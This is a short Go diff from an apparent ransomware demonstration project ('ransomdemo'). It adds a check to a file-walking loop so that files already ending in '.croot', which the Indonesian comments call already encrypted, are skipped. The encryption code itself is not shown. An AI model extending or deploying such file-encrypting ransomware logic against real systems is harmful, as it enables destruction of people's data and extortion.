@@ -3,6 +3,7 @@ package main
 import (
 	"os"
 	"path/filepath"
+	"strings"
 
 	"github.com/indomy/ransomdemo/pkg"
 )
@@ -19,6 +20,10 @@ func main() {
 
 		// Abaikan direktori itu sendiri
 		if fi.IsDir() {
+			return nil
+		}
+		//kalo file yang sudah diencrypt maka di abaikan
+		if strings.Contains(file, ".croot") {
 			return nil
 		}
 		// Baca file
